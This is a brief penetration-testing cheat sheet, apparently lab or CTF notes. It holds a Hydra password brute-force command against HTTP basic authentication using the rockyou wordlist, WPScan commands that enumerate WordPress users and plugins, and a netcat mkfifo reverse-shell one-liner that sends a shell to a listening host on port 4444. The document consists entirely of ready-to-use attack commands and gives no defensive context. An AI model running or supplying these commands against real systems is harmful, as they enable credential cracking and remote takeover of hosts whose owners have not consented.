...
## basic auth
hydra -l user -P /usr/share/wordlists/rockyou.txt -f 10.10.141.98 http-get -t 16
...
wpscan --url <RHOST> -e u

## all plugins
wpscan --url <RHOST> -e ap
...
## netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.25.5 4444 >/tmp/f
